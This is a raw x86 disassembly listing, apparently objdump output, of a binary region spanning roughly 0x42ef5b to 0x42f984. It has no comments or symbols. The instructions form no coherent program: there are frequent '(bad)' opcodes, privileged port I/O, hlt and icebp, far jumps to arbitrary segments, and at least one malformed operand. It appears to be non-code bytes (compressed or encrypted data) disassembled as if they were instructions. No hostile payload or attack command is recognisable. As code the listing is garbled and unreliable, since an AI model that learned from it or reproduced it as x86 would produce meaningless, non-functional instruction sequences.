  42ef5b:	scas   al,BYTE PTR es:[edi]
  42ef5c:	mov    ds:0xcf859ad5,al
  42ef61:	push   0xf
  42ef63:	in     al,0xae
  42ef65:	cmp    dl,BYTE PTR [ebp-0x24]
  42ef68:	mov    BYTE PTR [ebp+0x48],bl
  42ef6b:	leave  
  42ef6c:	push   eax
  42ef6d:	push   esi
  42ef6e:	sub    ecx,ebp
  42ef70:	dec    edx
  42ef71:	pop    esp
  42ef72:	mov    cl,0xb1
  42ef74:	add    eax,0xff6e6b0d
  42ef79:	or     eax,edx
  42ef7b:	cmp    ebx,DWORD PTR [edi-0x484c8fb2]
  42ef81:	sub    al,0x16
  42ef83:	xchg   esi,eax
  42ef84:	(bad)  
  42ef85:	cmp    bh,BYTE PTR [esi+0x7376181d]
  42ef8b:	pop    edx
  42ef8c:	sbb    eax,0x773da8d
  42ef91:	test   al,0xe6
  42ef93:	jne    0x42ef6c
  42ef95:	push   ebp
  42ef96:	popa   
  42ef97:	cmp    DWORD PTR [ecx-0x25],ebp
  42ef9a:	daa    
  42ef9b:	push   ebp
  42ef9c:	mov    eax,ds:0x8eade573
  42efa1:	mov    ch,0x7e
  42efa3:	push   ds
  42efa4:	adc    bl,0xa3
  42efa7:	inc    esp
  42efa8:	mov    edx,0xeee6e05d
  42efad:	test   DWORD PTR [esi-0x7347ae50],esi
  42efb3:	lahf   
  42efb4:	pop    ss
  42efb5:	ror    DWORD PTR [esi],cl
  42efb7:	ins    DWORD PTR es:[edi],dx
  42efb8:	icebp  
  42efb9:	xor    BYTE PTR [ecx],ah
  42efbb:	sub    BYTE PTR [ecx],cl
  42efbd:	xor    al,0xb8
  42efbf:	inc    ebx
  42efc0:	fisub  WORD PTR [eax+0x1]
  42efc3:	(bad)  
  42efc4:	fs je  0x42ef98
  42efc7:	cwde   
  42efc8:	cld    
  42efc9:	sar    edx,1
  42efcb:	lods   eax,DWORD PTR ds:[esi]
  42efcc:	enter  0xe06d,0xbb
  42efd0:	jp     0x42efbd
  42efd2:	sub    esp,DWORD PTR [eax+esi*4+0xf5700a]
  42efd9:	jo     0x42effe
  42efdb:	cmp    al,BYTE PTR [ebp-0x20a389a1]
  42efe1:	xchg   ecx,eax
  42efe2:	retf   0xa59e
  42efe5:	add    DWORD PTR [edx-0x3997d821],eax
  42efeb:	mov    ch,BYTE PTR ds:[edi-0x67d6f437]
  42eff2:	sbb    DWORD PTR es:[ecx+0x57],eax
  42eff6:	addr16 and eax,0x25566229
  42effc:	xchg   esp,eax
  42effd:	mov    esp,0x96737978
  42f002:	in     al,dx
  42f003:	pop    ds
  42f004:	mov    ebx,0xf0269fed
  42f009:	jmp    0x6819:0xdd2dd276
  42f010:	fild   WORD PTR [eax]
	...
  42f072:	add    BYTE PTR [eax],al
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	out    0x78,al
  42f082:	or     esi,DWORD PTR [ecx]
  42f084:	cmp    eax,0x1050001
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	pop    ss
  42f08d:	iret   
  42f08e:	int3   
  42f08f:	das    
  42f090:	cmp    DWORD PTR [ebx+0x796508c5],0xffffffac
  42f097:	lahf   
  42f098:	out    dx,al
  42f099:	sub    cl,BYTE PTR [ecx+0x67c44e52]
  42f09f:	push   0x7d4a5e83
  42f0a4:	imul   eax,DWORD PTR [ecx-0x90e3586],0x6b37af72
  42f0ae:	stos   BYTE PTR es:[edi],al
  42f0af:	jns    0x42f087
  42f0b1:	test   al,0xc
  42f0b3:	add    eax,0xc491c345
  42f0b8:	fnstenv [ecx+ecx*1-0x15d52b0]
  42f0bf:	ins    BYTE PTR es:[edi],dx
  42f0c0:	fwait
  42f0c1:	loopne 0x42f113
  42f0c3:	loopne 0x42f125
  42f0c5:	or     al,0x53
  42f0c7:	(bad)  
  42f0c8:	xchg   edi,eax
  42f0c9:	(bad)  
  42f0ca:	mov    gs,WORD PTR [eax]
  42f0cc:	inc    edx
  42f0cd:	dec    edi
  42f0ce:	aam    0xd7
  42f0d0:	xor    BYTE PTR [edi+esi*8-0x53632840],dl
  42f0d7:	mov    al,ds:0xf66b1ffc
  42f0dc:	mov    ?,WORD PTR [esi+0x47]
  42f0df:	hlt    
  42f0e0:	lea    eax,[ecx+0x57]
  42f0e3:	sti    
  42f0e4:	mov    dl,0x93
  42f0e6:	mov    esp,0x56483c46
  42f0eb:	pop    eax
  42f0ec:	push   edx
  42f0ed:	sbb    edi,DWORD PTR [ebx-0x1188d798]
  42f0f3:	push   ebp
  42f0f4:	jmp    0x994:0xbb8d894c
  42f0fb:	and    al,BYTE PTR [edx]
  42f0fd:	inc    ebx
  42f0fe:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42f100:	fcom   QWORD PTR [edi-0x50d3dc86]
  42f106:	xor    ecx,DWORD PTR [ebp-0x72]
  42f109:	sbb    al,0xdf
  42f10b:	xchg   eax,eax
  42f10d:	popf   
  42f10e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f10f:	imul   ebx,DWORD PTR [edi+0x63],0xba996782
  42f116:	mov    ebp,0x174b4d3f
  42f11b:	push   eax
  42f11c:	andps  xmm2,XMMWORD PTR [edx*2-0x578ef520]
  42f124:	pop    edi
  42f125:	test   DWORD PTR [eax],eax
  42f127:	clc    
  42f128:	cmp    DWORD PTR [esp+ebx*1],ecx
  42f12b:	jo     0x42f106
  42f12d:	pop    es
  42f12e:	aas    
  42f12f:	les    ebx,FWORD PTR [edi-0xd]
  42f132:	push   edx
  42f133:	add    bh,BYTE PTR [ebp-0x723da3cf]
  42f139:	cs dec esp
  42f13b:	push   0x3b
  42f13d:	cmp    ecx,DWORD PTR [edx+0x44]
  42f140:	aam    0xe9
  42f142:	xchg   ecx,eax
  42f143:	ss retf 
  42f145:	mov    edi,0x66a8596d
  42f14a:	dec    ecx
  42f14b:	add    BYTE PTR [ebp-0x66],0x61
  42f14f:	add    al,0xec
  42f151:	mov    esi,0xddf098f4
  42f156:	cld    
  42f157:	or     ah,BYTE PTR [eax]
  42f159:	repnz inc edx
  42f15b:	mov    ebx,0xe616ba2b
  42f160:	iret   
  42f161:	mov    ecx,0x9081db30
  42f166:	call   FWORD PTR [eax]
  42f168:	xor    eax,0x82617e7e
  42f16d:	pushf  
  42f16e:	jno    0x42f1d7
  42f170:	fwait
  42f171:	lea    ebx,[eax-0x5b]
  42f174:	mov    BYTE PTR [edx-0x466ae575],bh
  42f17a:	cmp    BYTE PTR [edi+eiz*1],bl
  42f17d:	outs   dx,DWORD PTR ds:[esi]
  42f17e:	jmp    0xbafd1cbe
  42f183:	dec    esi
  42f184:	inc    esp
  42f185:	cmp    eax,0x9356967c
  42f18a:	jl     0x42f136
  42f18c:	ja     0x42f13e
  42f18e:	mov    bh,0xe0
  42f190:	jo     0x42f192
	...
  42f1f2:	add    BYTE PTR [eax],al
  42f1f4:	pop    edx
  42f1f5:	es jecxz 0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	jmp    0x42f182
  42f202:	or     esp,edi
  42f204:	xchg   cl,bh
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0xa2000001
  42f20d:	sub    esp,DWORD PTR [ecx+0x22]
  42f210:	dec    esi
  42f211:	fldenv [ecx+ebx*1-0x28]
  42f215:	push   ebp
  42f216:	xor    ebp,DWORD PTR [ecx+0x16748d14]
  42f21c:	arpl   WORD PTR [ecx+esi*8-0x79b11afa],si
  42f223:	mov    esi,0x6ebf0f7f
  42f228:	ss gs mov esp,0xebac5f33
  42f22f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f230:	or     dh,dl
  42f232:	adc    edi,DWORD PTR [ebx-0x232037d3]
  42f238:	cmc    
  42f239:	in     eax,dx
  42f23a:	loopne 0x42f232
  42f23c:	mov    bl,0x2a
  42f23e:	jmp    0x42f25d
  42f240:	mov    ecx,0xbe479089
  42f245:	xor    dl,BYTE PTR [esi+0xf]
  42f248:	cmovp  eax,DWORD PTR [edi+ebp*8]
  42f24c:	fsubr  QWORD PTR [edi]
  42f24e:	fchs   
  42f250:	xor    eax,eax
  42f252:	adc    BYTE PTR [edx+ebp*8+0x7ee118ff],bh
  42f259:	pop    ebx
  42f25a:	ret    
  42f25b:	xor    esi,DWORD PTR [esi+0x77c2d0cf]
  42f261:	popa   
  42f262:	and    eax,0xf6a1abf1
  42f267:	sub    BYTE PTR [eax+eax*4],bh
  42f26a:	dec    eax
  42f26b:	mov    esp,0x5895d7f5
  42f270:	and    eax,0x794ea2b5
  42f275:	adc    bl,bh
  42f277:	lea    ebx,[ecx-0xd]
  42f27a:	or     esi,ecx
  42f27c:	mov    ds:0x1ecbd109,eax
  42f281:	dec    eax
  42f282:	in     eax,dx
  42f283:	xchg   edi,eax
  42f284:	repnz addr16 popf 
  42f287:	out    dx,al
  42f288:	dec    esi
  42f289:	pop    eax
  42f28a:	loop   0x42f28a
  42f28c:	mov    bl,0x2d
  42f28e:	cmp    edx,DWORD PTR [esi-0x27]
  42f291:	(bad)  
  42f292:	jmp    0x4975bbfc
  42f297:	fdivr  st(3),st
  42f299:	xchg   edi,eax
  42f29a:	xchg   ebx,eax
  42f29b:	cmp    al,0x2b
  42f29d:	repnz sub bh,cl
  42f2a0:	jmp    0x42f25c
  42f2a2:	int3   
  42f2a3:	popa   
  42f2a4:	mov    eax,0x5bb2962f
  42f2a9:	cwde   
  42f2aa:	neg    dl
  42f2ac:	dec    esi
  42f2ad:	pop    ebx
  42f2ae:	int3   
  42f2af:	sub    cl,0x3f
  42f2b2:	adc    eax,0x65e7efe8
  42f2b7:	pop    ebx
  42f2b8:	add    eax,0x5730a7cc
  42f2bd:	test   al,0xbc
  42f2bf:	dec    edi
  42f2c0:	stos   BYTE PTR es:[edi],al
  42f2c1:	push   esi
  42f2c2:	je     0x42f2f2
  42f2c4:	test   eax,0x18064414
  42f2c9:	dec    ebx
  42f2ca:	mov    cs,WORD PTR [ebx]
  42f2cc:	add    DWORD PTR [ebx-0x58],ebp
  42f2cf:	or     ecx,eax
  42f2d1:	xchg   ebx,eax
  42f2d2:	mov    esp,0xafe129a2
  42f2d7:	das    
  42f2d8:	repnz mov ecx,0x63513c65
  42f2de:	dec    ebp
  42f2df:	fsub   st,st(4)
  42f2e1:	cs repz hlt 
  42f2e4:	loop   0x42f2bb
  42f2e6:	mov    esi,0x74dc51da
  42f2eb:	mov    edx,0xf78fa05d
  42f2f0:	xor    eax,0x299c7cd0
  42f2f5:	and    bh,bl
  42f2f7:	push   eax
  42f2f8:	jmp    FWORD PTR [eax+0x2]
  42f2fb:	(bad)  
  42f2fc:	retf   
  42f2fd:	aas    
  42f2fe:	fwait
  42f2ff:	dec    al
  42f301:	(bad)  
  42f302:	mov    bl,0x45
  42f304:	and    BYTE PTR [ebx],al
  42f306:	ins    DWORD PTR es:[edi],dx
  42f307:	repz sbb al,0xdb
  42f30a:	adc    ebp,esp
  42f30c:	fisubr DWORD PTR [eax]
  42f30e:	outs   dx,DWORD PTR ds:[esi]
  42f30f:	leave  
  42f310:	cmp    DWORD PTR [eax],eax
	...
  42f372:	add    BYTE PTR [eax],al
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	mov    edx,0x8bfbbb72
  42f385:	cli    
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0x62000001
  42f38d:	xlat   BYTE PTR ds:[ebx]
  42f38e:	mov    al,0x4c
  42f390:	sub    eax,0x6bf113bf
  42f395:	dec    esp
  42f396:	pop    edi
  42f397:	bswap  ecx
  42f399:	sub    cl,cl
  42f39b:	push   0xa09e4b04
  42f3a0:	adc    al,al
  42f3a2:	lods   eax,DWORD PTR ds:[esi]
  42f3a3:	lds    dx,DWORD PTR [edx]
  42f3a6:	sbb    esp,0x3c9f0e19
  42f3ac:	call   0x80fc9d6f
  42f3b1:	xchg   ecx,eax
  42f3b2:	ins    DWORD PTR es:[edi],dx
  42f3b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3b4:	mov    ds:0x82ea95e0,eax
  42f3b9:	mov    ds:0x698abcb2,eax
  42f3be:	add    al,0x3e
  42f3c0:	jns    0x42f385
  42f3c2:	sbb    ah,BYTE PTR [eax+ebp*8]
  42f3c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3c6:	push   ds
  42f3c7:	push   ds
  42f3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f3c9:	pop    ecx
  42f3ca:	sub    eax,0xda70a169
  42f3cf:	inc    ebx
  42f3d0:	jnp    0x42f390
  42f3d2:	std    
  42f3d3:	fist   WORD PTR [edx-0x78d10aa0]
  42f3d9:	jo     0x42f3c6
  42f3db:	(bad)  
  42f3dc:	stos   DWORD PTR es:[edi],eax
  42f3dd:	mov    ds:0xd631968f,al
  42f3e2:	pop    ds
  42f3e3:	leave  
  42f3e4:	push   ebx
  42f3e5:	xor    eax,0x6c3c98ec
  42f3ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3eb:	dec    ecx
  42f3ec:	inc    eax
  42f3ed:	js     0x42f459
  42f3ef:	pop    ebp
  42f3f0:	ret    0xabed
  42f3f3:	mov    esi,0xacf2ae89
  42f3f8:	(bad)  
  42f3f9:	xchg   esp,eax
  42f3fa:	dec    edx
  42f3fb:	xchg   ebp,eax
  42f3fc:	or     DWORD PTR [eax],ecx
  42f3fe:	add    al,0x4e
  42f400:	inc    ebp
  42f401:	jne    0x42f455
  42f403:	icebp  
  42f404:	cmp    esp,ecx
  42f406:	or     cl,BYTE PTR [ecx-0x34ce79b2]
  42f40c:	aad    0xc3
  42f40e:	xchg   edi,eax
  42f40f:	mov    dl,0xe9
  42f411:	repz and al,0xe3
  42f414:	cmp    esi,edi
  42f416:	arpl   bp,dx
  42f418:	dec    edi
  42f419:	call   0xb3cd36a8
  42f41e:	pop    es
  42f41f:	imul   ebp,DWORD PTR [edx+0x27],0x3d
  42f423:	daa    
  42f424:	xchg   esp,eax
  42f425:	mov    cl,0x4f
  42f427:	inc    ebp
  42f428:	mov    ch,0x5c
  42f42a:	pop    edx
  42f42b:	fwait
  42f42c:	jbe    0x42f490
  42f42e:	xchg   esi,eax
  42f42f:	mov    esi,0x3338de1b
  42f434:	jp     0x42f411
  42f436:	cmp    al,0xf7
  42f438:	dec    ebp
  42f439:	addr16 call 0x9c3a:0x9e65a974
  42f441:	jmp    0x9ce3:0x84e1fbd1
  42f448:	inc    esp
  42f449:	pushf  
  42f44a:	pop    ds
  42f44b:	pop    esp
  42f44c:	jne    0x42f4cc
  42f44e:	push   es
  42f44f:	pop    edx
  42f450:	and    ah,al
  42f452:	sahf   
  42f453:	pop    edx
  42f454:	out    0x61,al
  42f456:	jno    0x42f400
  42f458:	pop    ecx
  42f459:	inc    edi
  42f45a:	inc    esi
  42f45b:	cwde   
  42f45c:	clc    
  42f45d:	lods   al,BYTE PTR ds:[esi]
  42f45e:	fsub   DWORD PTR [edi]
  42f460:	aas    
  42f461:	jecxz  0x42f412
  42f463:	mov    ecx,edi
  42f465:	and    cl,ch
  42f467:	(bad)  
  42f468:	and    eax,DWORD PTR [esi-0x6e]
  42f46b:	leave  
  42f46c:	shl    BYTE PTR [esi],cl
  42f46e:	pop    esp
  42f46f:	shl    DWORD PTR [eax],0x2d
  42f472:	icebp  
  42f473:	lock mov bl,0x9a
  42f476:	retf   
  42f477:	enter  0xc9ad,0x82
  42f47b:	fwait
  42f47c:	inc    eax
  42f47d:	adc    eax,0x7583ad38
  42f482:	or     ah,BYTE PTR [ecx]
  42f484:	aad    0x7e
  42f486:	dec    edi
  42f487:	or     dh,BYTE PTR [edx-0x29be0e2c]
  42f48d:	pushf  
  42f48e:	jno    0x42f454
  42f490:	jo     0x42f492
	...
  42f4f2:	add    BYTE PTR [eax],al
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	pushf  
  42f501:	repnz inc eax
  42f503:	sbb    edx,DWORD PTR [eax+0x50001fb]
  42f509:	add    DWORD PTR [eax],eax
  42f50b:	add    dl,dl
  42f50d:	neg    DWORD PTR [esi]
  42f50f:	and    ah,BYTE PTR ds:0x6594de8b
  42f515:	call   0xe34a:0x22a2d779
  42f51c:	sbb    al,BYTE PTR [eax]
  42f51e:	mov    bh,0x2f
  42f520:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f522:	(bad)  
  42f523:	cmp    al,0xd0
  42f525:	(bad)  
  42f526:	and    DWORD PTR [edx],ecx
  42f528:	or     ch,al
  42f52a:	call   0xeec5a304
  42f52f:	mov    BYTE PTR [esi-0x28bee59d],ch
  42f535:	sbb    dh,bh
  42f537:	cwde   
  42f538:	sub    bh,dh
  42f53a:	fucom  st(2)
  42f53c:	leave  
  42f53d:	out    0x56,al
  42f53f:	mov    cl,0x84
  42f541:	fcom   QWORD PTR [esi-0x6f]
  42f544:	test   al,0x4a
  42f546:	ins    DWORD PTR es:[edi],dx
  42f547:	xchg   ecx,eax
  42f548:	not    DWORD PTR [ebx]
  42f54a:	out    dx,al
  42f54b:	push   es
  42f54c:	jmp    0x28ee:0x6cb15dba
  42f553:	pop    edi
  42f554:	cmp    al,0xa5
  42f556:	and    esi,DWORD PTR [ebp+ebp*1+0x23]
  42f55a:	leave  
  42f55b:	or     al,ah
  42f55d:	jecxz  0x42f5b3
  42f55f:	mov    dh,0x17
  42f561:	(bad)  
  42f562:	pop    edx
  42f563:	or     esp,ebx
  42f565:	or     DWORD PTR [eax-0x5b],esi
  42f568:	loopne 0x42f545
  42f56a:	mov    al,ds:0xea457be0
  42f56f:	jmp    0x36e4:0x199bf2a9
  42f576:	mov    dh,0xb3
  42f578:	ins    DWORD PTR es:[edi],dx
  42f579:	push   0x2f56cede
  42f57e:	loope  0x42f532
  42f580:	and    DWORD PTR [ebx-0x49],0xffffff99
  42f584:	sub    al,0xb5
  42f586:	add    bh,BYTE PTR [edx]
  42f588:	cmp    al,BYTE PTR [edi+edx*2+0x5d]
  42f58c:	mov    dl,0x3d
  42f58e:	stc    
  42f58f:	pop    edx
  42f590:	cmp    eax,0xbe43a8d2
  42f595:	mov    bl,0x1d
  42f597:	jge    0x42f561
  42f599:	lds    esp,FWORD PTR [esi+0x1a4b0d51]
  42f59f:	retf   0xdf70
  42f5a2:	adc    DWORD PTR [eax-0x7653337d],eax
  42f5a8:	cdq    
  42f5a9:	and    cl,BYTE PTR [ebx-0x78]
  42f5ac:	jne    0x42f5d8
  42f5ae:	xchg   ebp,eax
  42f5af:	add    eax,0xbdd7c0
  42f5b4:	adc    esp,DWORD PTR [esi]
  42f5b6:	shr    BYTE PTR [eax+0x52],1
  42f5b9:	ins    BYTE PTR es:[edi],dx
  42f5ba:	out    0xf2,eax
  42f5bc:	dec    edi
  42f5bd:	data16 test BYTE PTR ss:[ecx-0x18bc4bc0],bh
  42f5c5:	lea    esi,[edx-0x7eb3e796]
  42f5cb:	js     0x42f63a
  42f5cd:	push   ds
  42f5ce:	pop    esp
  42f5cf:	cmp    ecx,DWORD PTR [ebx+0x64]
  42f5d2:	add    BYTE PTR [ebx-0x6a68e22c],dh
  42f5d8:	jb     0x42f578
  42f5da:	sbb    eax,0x396ec740
  42f5df:	push   edi
  42f5e0:	in     al,dx
  42f5e1:	and    ecx,DWORD PTR [eax+edx*4+0x70]
  42f5e5:	mov    bh,0xab
  42f5e7:	mov    cs,ebp
  42f5e9:	cmp    bh,al
  42f5eb:	fisubr WORD PTR [esi+ebp*1-0x58196228]
  42f5f2:	outs   dx,BYTE PTR ds:[esi]
  42f5f3:	fstp   QWORD PTR [ecx+ecx*2]
  42f5f6:	mov    ecx,0x7969276f
  42f5fb:	cwde   
  42f5fc:	lock fldenv [ebx]
  42f5ff:	movaps xmm3,XMMWORD PTR [edi-0x54d59b74]
  42f606:	gs and edi,esp
  42f609:	dec    esi
  42f60a:	test   al,0x27
  42f60c:	or     bh,BYTE PTR [ebp+0x21]
  42f60f:	inc    edi
  42f610:	dec    ebp
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	cmp    eax,0x95ef0bfd
  42f685:	cld    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0x3a000001
  42f68d:	repnz popa 
  42f68f:	icebp  
  42f690:	dec    edi
  42f691:	stos   DWORD PTR es:[edi],eax
  42f692:	cmp    ebx,DWORD PTR ss:[eax]
  42f695:	dec    edi
  42f696:	xchg   bh,al
  42f698:	xlat   BYTE PTR ds:[ebx]
  42f699:	add    BYTE PTR [eax-0x1fbe19fc],cl
  42f69f:	(bad)  
  42f6a0:	mov    ah,0xf7
  42f6a2:	sub    al,0x7a
  42f6a4:	cmp    al,0x30
  42f6a6:	sub    eax,0xbeecca6a
  42f6ab:	ins    BYTE PTR es:[edi],dx
  42f6ac:	les    edi,FWORD PTR ss:[esi+esi*2]
  42f6b0:	jnp    0x42f6fd
  42f6b2:	jl     0x42f65c
  42f6b4:	enter  0x643c,0x39
  42f6b8:	out    dx,al
  42f6b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6ba:	sub    dl,BYTE PTR [edx]
  42f6bc:	cs add dl,dh
  42f6bf:	aas    
  42f6c0:	push   ebp
  42f6c1:	sub    edx,DWORD PTR [ecx]
  42f6c3:	cmp    eax,0x90fca345
  42f6c8:	daa    
  42f6c9:	arpl   WORD PTR [esp+eax*4-0x1],di
  42f6cd:	lahf   
  42f6ce:	add    BYTE PTR [eax],0xe9
  42f6d1:	xor    DWORD PTR [ecx-0x4f],0xeb78db40
  42f6d8:	mov    DWORD PTR [ecx+0x30],ebp
  42f6db:	clc    
  42f6dc:	push   ss
  42f6dd:	xor    al,0xfc
  42f6df:	adc    ebx,DWORD PTR [ecx-0x49]
  42f6e2:	retf   0xb9f2
  42f6e5:	ror    esp,1
  42f6e7:	jne    0x42f6d0
  42f6e9:	pushf  
  42f6ea:	mov    edi,0x4bedb163
  42f6ef:	std    
  42f6f0:	mov    eax,0x819a2b4c
  42f6f5:	or     cl,BYTE PTR [ebp-0x63]
  42f6f8:	test   al,0x6b
  42f6fa:	ss pop ebx
  42f6fc:	push   cs
  42f6fd:	sbb    eax,0x4be54f60
  42f702:	jg     0x42f732
  42f704:	stos   DWORD PTR es:[edi],eax
  42f705:	loope  0x42f6b5
  42f707:	jecxz  0x42f6c8
  42f709:	dec    ebp
  42f70a:	add    al,0x42
  42f70d:	inc    ebx
  42f70e:	stos   BYTE PTR es:[edi],al
  42f70f:	mov    esi,0x3ebf7bb6
  42f714:	mov    ds:0xf5a20311,eax
  42f719:	mov    ebx,0x5fe470ee
  42f71e:	adc    BYTE PTR [ebx+0x2],bl
  42f721:	cmp    ebx,0x31
  42f724:	mov    dh,0x60
  42f726:	call   0xecfa:0xf2f3eb8
  42f72d:	mov    al,ds:0xc8c6a9f
  42f732:	stc    
  42f733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f734:	or     al,0xf8
  42f736:	sbb    eax,0x5743c767
  42f73b:	test   DWORD PTR [edx+0x3f],edi
  42f73e:	or     BYTE PTR [edx],ah
  42f740:	push   eax
  42f741:	jbe    0x42f75d
  42f743:	mov    dl,dh
  42f745:	dec    esp
  42f746:	mov    esp,0x92d8a1d9
  42f74b:	push   0x28da72b7
  42f750:	mov    BYTE PTR [esi-0x15d288f9],dh
  42f756:	mov    ah,0xd7
  42f758:	add    al,0x1d
  42f75a:	xlat   BYTE PTR ds:[ebx]
  42f75b:	call   0x6fd57c88
  42f760:	dec    eax
  42f762:	pushf  
  42f763:	mov    BYTE PTR [ecx],bh
  42f765:	ds push ds
  42f767:	clc    
  42f768:	sbb    BYTE PTR [eax+ebp*8-0x7a],ah
  42f76c:	mov    dh,0x46
  42f76e:	jo     0x42f7c7
  42f770:	sub    BYTE PTR [ecx-0x18],0xd8
  42f774:	pusha  
  42f775:	hlt    
  42f776:	mov    bh,bl
  42f778:	inc    eax
  42f779:	pop    edx
  42f77a:	mov    WORD PTR [edi+0x6],cs
  42f77d:	jge    0x42f744
  42f77f:	pop    ss
  42f780:	adc    bl,BYTE PTR [si]
  42f783:	loope  0x42f7e9
  42f785:	(bad)
  42f789:	mov    ecx,DWORD PTR [eax]
  42f78b:	sbb    BYTE PTR [edx-0x12],0xae
  42f78f:	push   esp
  42f790:	add    eax,DWORD PTR [eax]
	...
  42f7f2:	add    BYTE PTR [eax],al
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xa5198c23
  42f804:	call   0x1:0x50001fd
  42f80b:	add    al,ah
  42f80d:	jne    0x42f868
  42f80f:	lea    edx,[ecx+0x62]
  42f812:	mov    WORD PTR [eax+0x5df54892],ds
  42f818:	das    
  42f819:	pop    ecx
  42f81a:	inc    esp
  42f81b:	push   cs
  42f81c:	push   ebx
  42f81d:	in     al,dx
  42f81e:	mov    ecx,DWORD PTR [ebp+0x2d377bb1]
  42f824:	inc    edi
  42f825:	fcom   QWORD PTR [ecx]
  42f827:	sbb    eax,0x85f566f1
  42f82c:	mov    cl,0x19
  42f82e:	jnp    0x42f847
  42f830:	mov    cl,dh
  42f832:	aaa    
  42f833:	in     al,0xca
  42f835:	into   
  42f836:	into   
  42f837:	jbe    0x42f876
  42f839:	ins    DWORD PTR es:[edi],dx
  42f83a:	repz scas eax,DWORD PTR es:[edi]
  42f83c:	sub    al,0x25
  42f83f:	jno    0x42f87a
  42f841:	sub    dh,BYTE PTR ds:0xc326996f
  42f847:	add    al,0x78
  42f849:	push   0x60
  42f84b:	or     eax,0xbf78db5f
  42f850:	lock shr bl,cl
  42f853:	sbb    DWORD PTR [ebx+0x395311c4],ebx
  42f859:	mov    ah,0x54
  42f85b:	les    eax,FWORD PTR [edi]
  42f85d:	cmp    cl,BYTE PTR [eax-0x13]
  42f860:	xchg   BYTE PTR [eax],ah
  42f862:	sbb    esp,DWORD PTR [eax+0x3f]
  42f865:	dec    ebp
  42f866:	leave  
  42f867:	or     BYTE PTR [eax+0x3b8fa2a7],al
  42f86d:	nop
  42f86e:	retf   0x2f6
  42f871:	xor    dl,BYTE PTR [ecx+edx*8-0xe2ebbd6]
  42f878:	scas   eax,DWORD PTR es:[edi]
  42f879:	(bad)  
  42f87a:	and    al,0x5
  42f87c:	(bad)  
  42f87d:	in     eax,0x50
  42f87f:	in     al,0xff
  42f881:	scas   al,BYTE PTR es:[edi]
  42f882:	mov    ecx,0xafdd8692
  42f887:	nop
  42f888:	add    al,0x2b
  42f88a:	or     DWORD PTR [edx+ebx*4+0x208da38a],ecx
  42f891:	stos   DWORD PTR es:[edi],eax
  42f892:	mov    ecx,0xb0fa1a08
  42f897:	or     dh,BYTE PTR [eax+eiz*4+0x75e8c19f]
  42f89e:	push   ecx
  42f89f:	jmp    0x6ae8:0x6d9bcf49
  42f8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8a7:	bound  esp,QWORD PTR [ebx+0x6733d776]
  42f8ad:	mov    ch,0x5e
  42f8af:	ficom  WORD PTR ds:0x581436b
  42f8b5:	or     ebx,0x8d1d568
  42f8bb:	jo     0x42f872
  42f8bd:	cwde   
  42f8be:	repz (bad) 
  42f8c1:	rcr    ebx,0x89
  42f8c4:	xchg   ebp,eax
  42f8c5:	pop    esi
  42f8c6:	jb     0x42f90a
  42f8c8:	xor    eax,0x10a4255
  42f8cd:	test   bl,ch
  42f8cf:	jae    0x42f8c9
  42f8d1:	jmp    0x4613:0xd7dc62a7
  42f8d8:	js     0x42f92d
  42f8da:	int3   
  42f8db:	add    eax,0xebe225b8
  42f8e0:	or     al,0x89
  42f8e2:	add    eax,0x776d9675
  42f8e7:	cmp    eax,0xbb31ea60
  42f8ec:	pop    eax
  42f8ed:	push   edx
  42f8ee:	pop    edx
  42f8ef:	or     ebx,ecx
  42f8f1:	pop    DWORD PTR [ecx+0x175f9aee]
  42f8f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8f8:	mov    esp,db3
  42f8fb:	nop
  42f8fc:	inc    esi
  42f8fd:	and    BYTE PTR [esi+0x6924ad18],0x61
  42f904:	inc    ecx
  42f905:	in     eax,dx
  42f906:	push   ebx
  42f907:	popa   
  42f908:	aad    0x5d
  42f90a:	jmp    0x42f92b
  42f90c:	and    eax,DWORD PTR [ebx+0x4]
  42f90f:	fcomp  DWORD PTR [edi+0x0]
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f99f
  42f981:	shr    BYTE PTR [ebx-0x5e],1
  42f984:	lahf   
